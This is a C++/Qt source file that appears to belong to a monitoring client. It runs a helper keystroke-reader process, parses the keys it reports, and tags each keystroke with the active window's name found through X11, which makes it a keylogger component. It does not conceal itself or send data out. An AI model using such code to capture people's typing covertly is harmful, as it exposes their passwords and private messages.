#include "KeyboardMonitor.h"

#include <QCoreApplication>
#include <QDebug>
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QJsonDocument>
#include <QJsonObject>
#include <QTextStream>

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>

KeyboardMonitor::KeyboardMonitor(QObject *parent)
    : QObject(parent)
{
}

KeyboardMonitor::~KeyboardMonitor()
{
    stopMonitoring();
}

QString KeyboardMonitor::helperPath() const
{
    const QString appDir = QCoreApplication::applicationDirPath();
    const QString candidate = appDir + QStringLiteral("/monitorclient-keyreader");
    if (QFileInfo::exists(candidate))
        return candidate;
    if (QFileInfo::exists(QStringLiteral("/opt/monitorclient/monitorclient-keyreader")))
        return QStringLiteral("/opt/monitorclient/monitorclient-keyreader");
    return QStringLiteral("monitorclient-keyreader");
}

bool KeyboardMonitor::startMonitoring()
{
    if (m_helper && m_helper->state() != QProcess::NotRunning) {
        qDebug() << "[KeyLog] helper already running";
        return true;
    }

    const QString path = helperPath();
    qInfo() << "[KeyLog] spawning helper:" << path;

    if (!QFileInfo::exists(path) && path.contains(QLatin1Char('/'))) {
        qWarning() << "[KeyLog] helper binary not found at" << path;
        return false;
    }

    m_helper = new QProcess(this);
    m_helper->setProcessChannelMode(QProcess::ForwardedErrorChannel);
    m_helper->setReadChannel(QProcess::StandardOutput);

    connect(m_helper, &QProcess::readyReadStandardOutput, this, &KeyboardMonitor::onReadyRead);
    connect(m_helper, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
            this, &KeyboardMonitor::onProcessFinished);

    m_helper->start(path, QStringList(), QIODevice::ReadOnly);
    if (!m_helper->waitForStarted(3000)) {
        qWarning() << "[KeyLog] helper failed to start:" << m_helper->errorString();
        delete m_helper;
        m_helper = nullptr;
        return false;
    }

    qInfo() << "[KeyLog] helper running, pid" << m_helper->processId();
    return true;
}

void KeyboardMonitor::stopMonitoring()
{
    if (!m_helper) return;
    if (m_helper->state() != QProcess::NotRunning) {
        m_helper->terminate();
        if (!m_helper->waitForFinished(2000))
            m_helper->kill();
    }
    delete m_helper;
    m_helper = nullptr;
    m_buf.clear();
}

void KeyboardMonitor::onReadyRead()
{
    m_buf.append(m_helper->readAllStandardOutput());

    int pos;
    while ((pos = m_buf.indexOf('\n')) >= 0) {
        const QByteArray line = m_buf.left(pos).trimmed();
        m_buf.remove(0, pos + 1);
        if (line.isEmpty()) continue;

        QJsonParseError err;
        const QJsonDocument doc = QJsonDocument::fromJson(line, &err);
        if (err.error != QJsonParseError::NoError || !doc.isObject())
            continue;

        const QJsonObject obj = doc.object();
        const QString ts  = obj.value(QStringLiteral("ts")).toString();
        const QString key = obj.value(QStringLiteral("key")).toString();
        if (key.isEmpty()) continue;

        const QString window = getActiveWindowTitle();
        emit keyPressed(ts, window, key);
    }
}

void KeyboardMonitor::onProcessFinished(int exitCode, QProcess::ExitStatus status)
{
    if (status == QProcess::CrashExit)
        qWarning() << "[KeyLog] helper crashed";
    else if (exitCode != 0)
        qWarning() << "[KeyLog] helper exited with code" << exitCode;
    else
        qInfo() << "[KeyLog] helper exited normally";
}

// --- Active window title (X11 / XWayland) --------------------------------

QString KeyboardMonitor::findDesktopFile(const QString &appClass)
{
    QStringList paths;
    paths << QStringLiteral("/usr/share/applications")
          << QStringLiteral("/usr/local/share/applications")
          << QDir::homePath() + QStringLiteral("/.local/share/applications");

    const QString lower = appClass.toLower();

    for (const QString &p : paths) {
        QDir dir(p);
        if (!dir.exists()) continue;
        const QStringList entries = dir.entryList(QStringList() << QStringLiteral("*.desktop"), QDir::Files);
        for (const QString &entry : entries) {
            if (entry.toLower() == lower + QStringLiteral(".desktop"))
                return dir.filePath(entry);
        }
    }

    for (const QString &p : paths) {
        QDir dir(p);
        if (!dir.exists()) continue;
        const QStringList entries = dir.entryList(QStringList() << QStringLiteral("*.desktop"), QDir::Files);
        for (const QString &entry : entries) {
            QFile file(dir.filePath(entry));
            if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) continue;
            QTextStream in(&file);
            while (!in.atEnd()) {
                const QString line = in.readLine();
                if ((line.startsWith(QStringLiteral("StartupWMClass="))
                     || line.startsWith(QStringLiteral("Exec="))
                     || line.startsWith(QStringLiteral("TryExec=")))
                    && line.contains(appClass, Qt::CaseInsensitive))
                    return dir.filePath(entry);
            }
        }
    }

    return {};
}

QString KeyboardMonitor::getActiveWindowTitle()
{
    Display *display = XOpenDisplay(nullptr);
    if (!display)
        return QStringLiteral("Unknown");

    Window root = DefaultRootWindow(display);
    Atom activeAtom = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
    Atom utf8 = XInternAtom(display, "UTF8_STRING", False);

    Atom actualType;
    int actualFmt;
    unsigned long items, after;
    unsigned char *data = nullptr;

    if (XGetWindowProperty(display, root, activeAtom, 0, 1, False, XA_WINDOW,
                           &actualType, &actualFmt, &items, &after, &data) == Success && data) {
        Window active = *reinterpret_cast<Window *>(data);
        XFree(data);
        data = nullptr;

        XClassHint *hint = XAllocClassHint();
        if (XGetClassHint(display, active, hint) && hint->res_name) {
            QString appClass = QString::fromUtf8(hint->res_class);
            QString appName  = QString::fromUtf8(hint->res_name);
            XFree(hint->res_name);
            XFree(hint->res_class);
            XFree(hint);

            QString desktop = findDesktopFile(appClass);
            if (!desktop.isEmpty()) {
                QFile f(desktop);
                if (f.open(QIODevice::ReadOnly | QIODevice::Text)) {
                    QTextStream in(&f);
                    bool inEntry = false;
                    while (!in.atEnd()) {
                        QString line = in.readLine();
                        if (line.startsWith(QStringLiteral("[Desktop Entry]"))) { inEntry = true; continue; }
                        if (line.startsWith(QLatin1Char('[')) && line.endsWith(QLatin1Char(']'))) { inEntry = false; continue; }
                        if (inEntry && line.startsWith(QStringLiteral("Name="))) {
                            XCloseDisplay(display);
                            return line.mid(5);
                        }
                    }
                }
            }
            appName.replace(QLatin1Char('-'), QLatin1Char(' '));
            if (!appName.isEmpty())
                appName[0] = appName[0].toUpper();
            XCloseDisplay(display);
            return appName;
        }
        if (hint) XFree(hint);

        Atom props[] = {
            XInternAtom(display, "_NET_WM_VISIBLE_NAME", False),
            XInternAtom(display, "_NET_WM_NAME", False),
            XA_WM_NAME
        };
        Atom types[] = { utf8, utf8, XA_STRING };
        for (int i = 0; i < 3; ++i) {
            if (XGetWindowProperty(display, active, props[i], 0, 1024, False, types[i],
                                   &actualType, &actualFmt, &items, &after, &data) == Success && data) {
                QString title = QString::fromUtf8(reinterpret_cast<char *>(data));
                XFree(data);
                XCloseDisplay(display);
                return title;
            }
        }
    }

    XCloseDisplay(display);
    return QStringLiteral("Unknown");
}
